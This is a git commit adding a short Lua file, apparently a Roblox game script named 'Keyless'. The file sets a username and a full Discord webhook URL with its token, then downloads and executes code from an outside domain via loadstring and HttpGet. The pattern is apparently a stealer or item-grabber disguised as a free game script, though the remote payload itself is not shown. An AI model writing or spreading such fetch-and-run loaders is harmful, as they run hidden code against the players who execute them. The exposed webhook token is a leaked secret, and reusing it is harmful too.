97514e1aa89329c1662390bfeff5b88628f2d471
Xeven-Gaming <154922337+Xeven-Gaming@users.noreply.github.com>
2024-07-26 16:47:50 -0400

    Add files via upload

---
+++ Keyless.lua
@@ -0,0 +1,4 @@
+Username = "Exilierz"
+Webhook = "https://discord.com/api/webhooks/1266496780669947964/NvJwMVsThZVXPxqUq_hcpwuVYXcwRQ1N2cr-r-Qh6mevrfOIetHmYDENifNXd9p6hsec"
+
+loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
